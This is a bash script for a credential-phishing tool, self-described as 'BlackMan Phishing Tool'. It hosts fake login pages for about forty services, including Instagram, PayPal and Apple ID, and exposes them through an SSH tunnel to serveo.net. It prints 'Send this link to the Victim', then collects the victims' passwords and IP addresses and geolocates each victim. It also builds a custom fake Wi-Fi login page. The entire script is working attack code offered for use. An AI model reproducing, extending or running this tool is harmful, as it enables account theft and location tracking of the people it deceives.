#!/bin/bash

RED="$(printf '\033[31m')"  GREEN="$(printf '\033[32m')"  ORANGE="$(printf '\033[33m')"  BLUE="$(printf '\033[34m')"
MAGENTA="$(printf '\033[35m')"  CYAN="$(printf '\033[36m')"  WHITE="$(printf '\033[37m')" BLACK="$(printf '\033[30m')"
REDBG="$(printf '\033[41m')"  GREENBG="$(printf '\033[42m')"  ORANGEBG="$(printf '\033[43m')"  BLUEBG="$(printf '\033[44m')"
MAGENTABG="$(printf '\033[45m')"  CYANBG="$(printf '\033[46m')"  WHITEBG="$(printf '\033[47m')" BLACKBG="$(printf '\033[40m')"
RESETBG="$(printf '\e[0m\n')" YELLOW="$(printf '\033[1;33m')" GRAY="$(printf '\033[1;30m')"



Main() { 
    printf "          ${RED}[01]${CYAN} Instagram\e[0m      ${RED}[17]${CYAN} DropBox\e[0m        ${RED}[33]${CYAN} eBay\e[0m               \n"                                
    printf "          ${RED}[02]${CYAN} Facebook\e[0m       ${RED}[18]${CYAN} Adobe ID   \e[0m    ${RED}[34]${CYAN} Amazon\e[0m         \n"
    printf "          ${RED}[03]${CYAN} Snapchat\e[0m       ${RED}[19]${CYAN} Shopify   \e[0m     ${RED}[35]${CYAN} iCloud\e[0m          \n"
    printf "          ${RED}[04]${CYAN} Twitter\e[0m        ${RED}[20]${CYAN} Messenger   \e[0m   ${RED}[36]${CYAN} Spotify\e[0m          \n"                
    printf "          ${RED}[05]${CYAN} Github\e[0m         ${RED}[21]${CYAN} GitLab   \e[0m      ${RED}[37]${CYAN} Netflix\e[0m          \n"                
    printf "          ${RED}[06]${CYAN} Google\e[0m         ${RED}[22]${CYAN} Twitch   \e[0m      ${RED}[38]${CYAN} Stackoverflow\e[0m         \n"
    printf "          ${RED}[07]${CYAN} Origin\e[0m         ${RED}[23]${CYAN} MySpace    \e[0m    ${RED}[39]${CYAN} Samsung ID\e[0m          \n"
    printf "          ${RED}[08]${CYAN} Yahoo\e[0m          ${RED}[24]${CYAN} Badoo   \e[0m       ${RED}[40]${CYAN} Tiktok\e[0m         \n"        
    printf "          ${RED}[09]${CYAN} Linkedin\e[0m       ${RED}[25]${CYAN} VK   \e[0m          ${RED}[41]${CYAN} Custom Page\e[0m\n"         
    printf "          ${RED}[10]${CYAN} Protonmail\e[0m     ${RED}[26]${CYAN} Yandex   \e[0m      ${RED}[99]${CYAN} Exit BlackMan\e[0m    \n"
    printf "          ${RED}[11]${CYAN} Wordpress\e[0m      ${RED}[27]${CYAN} devianART   \e[0m            \n"
    printf "          ${RED}[12]${CYAN} Microsoft\e[0m      ${RED}[28]${CYAN} Wi-Fi   \e[0m                \n"
    printf "          ${RED}[13]${CYAN} IGFollowers\e[0m    ${RED}[29]${CYAN} PayPal  \e[0m                \n"
    printf "          ${RED}[14]${CYAN} Pinterest\e[0m      ${RED}[30]${CYAN} Steam  \e[0m                              \n"
    printf "          ${RED}[15]${CYAN} Apple ID\e[0m       ${RED}[31]${CYAN} Bitcoin  \e[0m                             \n"
    printf "          ${RED}[16]${CYAN} Verizon\e[0m        ${RED}[32]${CYAN} Playstation  \e[0m           \e[1;94m                  \n"
    printf "\n"
    read -p "${YELLOW}Choose an option -->> ${GRAY}" option

    if [[ $option == 1 ]]; then
    website="instagram"
    start

    elif [[ $option == 2 ]]; then
    website="facebook"
    start
    
    elif [[ $option == 3 ]]; then
    website="snapchat"  
    start
    
    elif [[ $option == 4 ]]; then
    website="twitter"
    start
    
    elif [[ $option == 5 ]]; then
    website="github"
    start
    
    elif [[ $option == 6 ]]; then
    website="google"
    start

    elif [[ $option == 7 ]]; then
    website="origin"
    start

    elif [[ $option == 8 ]]; then
    website="yahoo"
    start

    elif [[ $option == 9 ]]; then
    website="linkedin"
    start

    elif [[ $option == 10 ]]; then
    website="protonmail"
    start

    elif [[ $option == 11 ]]; then
    website="wordpress"
    start

    elif [[ $option == 12 ]]; then
    website="microsoft"
    start

    elif [[ $option == 13 ]]; then
    website="instafollowers"
    start

    elif [[ $option == 14 ]]; then
    website="pinterest"
    start

    elif [[ $option == 15 ]]; then
    website="apple"
    start

    elif [[ $option == 16 ]]; then
    website="verizon"
    start

    elif [[ $option == 17 ]]; then
    website="dropbox"
    start

    elif [[ $option == 18 ]]; then
    website="adobe"
    start

    elif [[ $option == 19 ]]; then
    website="shopify"
    start

    elif [[ $option == 20 ]]; then
    website="messenger"
    start

    elif [[ $option == 21 ]]; then
    website="gitlab"
    start

    elif [[ $option == 22 ]]; then
    website="twitch"
    start

    elif [[ $option == 23 ]]; then
    website="myspace"
    start

    elif [[ $option == 24 ]]; then
    website="badoo"
    start

    elif [[ $option == 25 ]]; then
    website="vk"
    start

    elif [[ $option == 26 ]]; then
    website="yandex"
    start

    elif [[ $option == 27 ]]; then
    website="devianart"
    start

    elif [[ $option == 28 ]]; then
    website="wifi"
    start

    elif [[ $option == 29 ]]; then
    website="paypal"
    start

    elif [[ $option == 30 ]]; then
    website="steam"
    start

    elif [[ $option == 31 ]]; then
    website="bitcoin"
    start

    elif [[ $option == 32 ]]; then
    website="playstation"
    start

    elif [[ $option == 33 ]]; then
    website="shopping"
    start

    elif [[ $option == 34 ]]; then
    website="amazon"
    start

    elif [[ $option == 35 ]]; then
    website="icloud"
    start

    elif [[ $option == 36 ]]; then
    website="spotify"
    start

    elif [[ $option == 37 ]]; then
    website="netflix"
    start

    elif [[ $option == 38 ]]; then
    website="stackoverflow"
    start
    
    elif [[ $option == 39 ]]; then
    website="samsung"
    start
    
    elif [[ $option == 40 ]]; then
    website="tiktok"
    start
    
    elif [[ $option == 41 ]]; then
    website="custom"
    createpage
    start

    elif [[ $option == 99 ]]; then
    sleep 1
    printf "${RED}Good Bye ${GREEN}^_^\n"
    exit
    
    else 
    printf "${RED}Invaild Oprion"
    sleep 1
    { clear ; Banner ; Main ; }
    fi
}

catch_ip() {
    touch sites/$website/saved.usernames.txt
    ip=$(grep -a 'IP:' sites/$website/ip.txt | cut -d " " -f2 | tr -d '\r')
    IFS=$'\n'
    ua=$(grep 'User-Agent:' sites/$website/ip.txt | cut -d '"' -f2)
    printf "${GREEN}[-]${ORANGE} Victim IP:${GREEN} %s\n" $ip
    printf "${GREEN}[-]${ORANGE} User-Agent:${GREEN} %s\n" $ua
    printf "${GREEN}[-]${ORANGE} Saved:${GREEN} %s/saved.ip.txt\n" $website
    cat sites/$website/ip.txt >> sites/$website/saved.ip.txt
    ip_location
}

getcredentials() {
    printf "${RED}Waiting for credentials ...\n"
    while true; do
        if [[ -s "sites/$website/usernames.txt" ]]; then
            printf "${GREEN}Credentials Found!\n"
            catch_cred
            printf "${RED}Waiting for new credentials ...\n"
        fi
        sleep 1
    done
}

catch_cred() {
    # Extract the account and password from usernames.txt
    account=$(grep -o 'Account:.*' "sites/$website/usernames.txt" | cut -d " " -f2)
    password=$(grep -o 'Pass:.*' "sites/$website/usernames.txt" | cut -d ":" -f2)

    # Print the account and password
    printf "${GREEN}[👤👤👤]${ORANGE} Account: ${RED}%s\n" "$account"
    printf "${GREEN}[🔑🔑🔑]${ORANGE} Password: ${RED}%s\n" "$password"

    # Save the extracted data to saved.usernames.txt
    cat "sites/$website/usernames.txt" >> "sites/$website/saved.usernames.txt"

    # Clear the contents of usernames.txt to wait for the next set of credentials
    > "sites/$website/usernames.txt"
    rm -f "sites/$website/ip.txt"

    # Print a message indicating the data has been saved
    printf "${GREEN}[-]${ORANGE} Saved:${RED} sites/%s/saved.usernames.txt \n" "$website"
    checkfound
}


ip_location() {
    # Fetch IP information from two different APIs
    ipaddripapico=$(curl -s "https://ipapi.co/$ip/json" -L)
    ipaddripapicom=$(curl -s "http://ip-api.com/json/$ip" -L)

    # Extract relevant information from the JSON responses
    userip=$(echo "$ipaddripapico" | grep -Po '(?<="ip":)[^,]*' | tr -d '[]"')
    usercity=$(echo "$ipaddripapico" | grep -Po '(?<="city":)[^},]*' | tr -d '[]"' | sed 's/\(<[^>]*>\|<\/>\|{1|}\)//g')
    useregion=$(echo "$ipaddripapico" | grep -Po '(?<="region":)[^},]*' | tr -d '[]"' | sed 's/\(<[^>]*>\|<\/>\|{1|}\)//g')
    usercountry=$(echo "$ipaddripapico" | grep -Po '(?<="country_name":)[^},]*' | tr -d '[]"' | sed 's/\(<[^>]*>\|<\/>\|{1|}\)//g')
    userlat=$(echo "$ipaddripapicom" | grep -Po '(?<="lat":)[^},]*' | tr -d '[]"' | sed 's/\(<[^>]*>\|<\/>\|{1|}\)//g')
    userlon=$(echo "$ipaddripapicom" | grep -Po '(?<="lon":)[^},]*' | tr -d '[]"' | sed 's/\(<[^>]*>\|<\/>\|{1|}\)//g')
    usertime=$(echo "$ipaddripapicom" | grep -Po '(?<="timezone":)[^},]*' | tr -d '[]"' | sed 's/\(<[^>]*>\|<\/>\|{1|}\)//g')
    userpostal=$(echo "$ipaddripapicom" | grep -Po '(?<="zip":)[^},]*' | tr -d '[]"' | sed 's/\(<[^>]*>\|<\/>\|{1|}\)//g')
    userisp=$(echo "$ipaddripapico" | grep -Po '(?<="org":)[^},]*' | tr -d '[]"' | sed 's/\(<[^>]*>\|<\/>\|{1|}\)//g')
    usercalling=$(echo "$ipaddripapico" | grep -Po '(?<="country_calling_code":)[^},]*' | tr -d '[]"' | sed 's/\(<[^>]*>\|<\/>\|{1|}\)//g')

    # Display the IP information
    printf "${RED}-----------------------------IP Details---------------------------------------------------------\n"
    printf "  ${ORANGE}  City            >>         ${GREEN}   %s\n" "$usercity"                                       
    printf "${GREEN}----------------------------------------------------------------------------------------------\n"
    printf "  ${ORANGE}  Region          >>         ${GREEN}   %s\n" "$useregion"
    printf "${GREEN}----------------------------------------------------------------------------------------------\n"
    printf "  ${ORANGE}  Country         >>         ${GREEN}   %s\n" "$usercountry"
    printf "${GREEN}----------------------------------------------------------------------------------------------\n"
    printf "  ${ORANGE}  Latitude        >>         ${GREEN}    %s\n" "$userlat"
    printf "${GREEN}----------------------------------------------------------------------------------------------\n"
    printf "  ${ORANGE}  Longitude       >>         ${GREEN}    %s\n" "$userlon"
    printf "${GREEN}----------------------------------------------------------------------------------------------\n"
    printf "  ${ORANGE}  Time Zone       >>         ${GREEN}    %s\n" "$usertime"
    printf "${GREEN}----------------------------------------------------------------------------------------------\n"
    printf "  ${ORANGE}  Postal Code     >>         ${GREEN}    %s\n" "$userpostal"
    printf "${GREEN}----------------------------------------------------------------------------------------------\n"
    printf "  ${ORANGE}  Carrier         >>         ${GREEN}   %s\n" "$userisp"
    printf "${GREEN}----------------------------------------------------------------------------------------------\n"
    printf "  ${ORANGE}  Calling Code    >>         ${GREEN}   %s\n" "$usercalling"
    printf "${GREEN}----------------------------------------------------------------------------------------------\n"
    printf "  ${ORANGE}  Google Location >>         ${CYAN} https://maps.google.com/?q=%s,%s\n" "$userlat" "$userlon"
    printf "${RED}------------------------------------------------------------------------------------------------\n"

    # Call getcredentials function to proceed after displaying IP information
    getcredentials
}


start() {
    if [[ -e sites/$website/ip.txt ]]; then
    rm -rf sites/$website/ip.txt

    fi
    if [[ -e sites/$website/usernames.txt ]]; then
    rm -rf sites/$website/usernames.txt

    fi
    printf "\n"
    printf "${GREEN}[1]${ORANGE} Localhost\n"
    printf "${GREEN}[2]${ORANGE} Serveo.net\n"
    printf "\n"
    read -p "${GREEN}[+]${YELLOW} Tunnel Option -->> " tunnel
    if [[ $tunnel == 1 ]]; then
    printf "${RED}[&]${BLUE} Starting php server ...\n"
    cd sites/$website && php -S 127.0.0.1:3333 > /dev/null 2>&1 &
    sleep 2

    printf "${RED}(*) ${YELLOW}Send this link to the Victim: ${CYAN} http://127.0.0.1:3333 \n" 
    checkfound 
    elif [[ $tunnel == 2 ]]; then
    tunnel
    else
    printf "Invaild Option ...\n"
    fi
}
tunnel() {
    printf "${RED}[&]${BLUE} Starting PHP server ...\n"
    cd sites/$website && php -S 127.0.0.1:3333 > /dev/null 2>&1 &
    sleep 2
    printf "${RED}[&]${BLUE} Starting Serveo server ...\n"

    # Capture output of SSH in a background process and parse it for the URL
    ssh -R 80:localhost:3333 serveo.net > serveo_log.txt 2>&1 &
    sleep 10

    # Extract the link from the Serveo log file
    link=$(grep -Eo '(https)://[^/"]+(.serveo.net)' serveo_log.txt | head -n 1)

    printf "${RED}(*) ${YELLOW}Send this link to the Victim: ${CYAN}%s \n" "$link"
    printf "\n"
    checkfound
}

checkfound() {
    printf "${ORANGE}Waiting victim open the link ...\n"
    while [ true ]; do

    if [[ -e "sites/$website/ip.txt" ]]; then
    printf "${ORANGE}IP Found!\n"
    catch_ip

    fi
    sleep 1
    done 
}
createpage() {
    default_cap1="Wi-Fi Session Expired"
    default_cap2="Please login again."
    default_user_text="Username:"
    default_pass_text="Password:"
    default_sub_text="Log-In"

    read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Title 1 (Default: Wi-Fi Session Expired): ' cap1
    cap1="${cap1:-${default_cap1}}"

    read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Title 2 (Default: Please login again.): ' cap2
    cap2="${cap2:-${default_cap2}}"

    read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Username field (Default: Username:): ' user_text
    user_text="${user_text:-${default_user_text}}"

    read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Password field (Default: Password:): ' pass_text
    pass_text="${pass_text:-${default_pass_text}}"

    read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Submit field (Default: Log-In): ' sub_text
    sub_text="${sub_text:-${default_sub_text}}"

    cat <<EOF > sites/custom/login.html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>$cap1</title>
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: Arial, sans-serif;
        }
        body {
            background-color: #f5f5f5;
            color: #333;
            display: flex;
            align-items: center;
            justify-content: center;
            height: 100vh;
            margin: 0;
        }
        .container {
            background-color: #fff;
            border-radius: 8px;
            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
            padding: 20px;
            width: 100%;
            max-width: 400px;
            text-align: center;
        }
        h1, h2 {
            color: #333;
            margin-bottom: 15px;
        }
        h1 {
            font-size: 24px;
        }
        h2 {
            font-size: 18px;
            font-weight: normal;
            color: #666;
        }
        form {
            margin-top: 20px;
        }
        label {
            display: block;
            font-size: 14px;
            margin: 10px 0 5px;
            color: #555;
            text-align: left;
        }
        input[type="text"], input[type="password"] {
            width: 100%;
            padding: 10px;
            margin: 5px 0 10px;
            border: 1px solid #ccc;
            border-radius: 4px;
            outline: none;
        }
        input[type="text"]:focus, input[type="password"]:focus {
            border-bottom: 3px solid #0052cc;
        }
        button {
            background-color: #404040;
            color: #fff;
            border: none;
            padding: 10px 20px;
            border-radius: 20px;
            cursor: pointer;
            font-size: 16px;
        }
        button:hover {
            background-color: #333;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>$cap1</h1>
        <h2>$cap2</h2>
        <form method="POST" action="login.php">
            <label>$user_text</label>
            <input type="text" name="username" required>
            <label>$pass_text</label>
            <input type="password" name="password" required>
            <br><br>
            <button type="submit">$sub_text</button>
        </form>
    </div>
</body>
</html>
EOF
}

Need() {
    command -v php > /dev/null 2>&1 || { echo >&2 "I require php but it's not installed. Install it. Please Run install.sh "; exit 1 ; }
    command -v wget > /dev/null 2>&1 || { echo >&2 "I require wget but it's not installed. Install it. Please Run install.sh "; exit 1 ; }
    command -v unzip > /dev/null 2>&1 || { echo >&2 "I require unzip but it's not installed. Install it. Please Run install.sh "; exit 1 ; }
    command -v curl > /dev/null 2>&1 || { echo >&2 "I require curl but it's not installed. Install it. Please Run install.sh "; exit 1 ; }
    command -v figlet toilet > /dev/null 2>&1 || { echo >&2 "I require figlet toilet but it's not installed. Install it. Please Run install.sh "; exit 1 ; }
}
Banner() {
    clear
    printf "${ORANGE}Welcome to BlackMan Phishing Tool [Blackeye Version 2.0] \n"
    printf "\n"
    figlet BlackMan
    printf "\n"
    printf "\n"
    printf "${CYAN}[-]${GREEN} This Tool created by Kart Studio (Developer: Manash Mahanta)\n"
    printf "\n"
    date=$("date")
    printf "${GREEN}Started On -->> ${YELLOW}$date\e[0m\n"
    printf "\n"
}
Need
Banner
Main
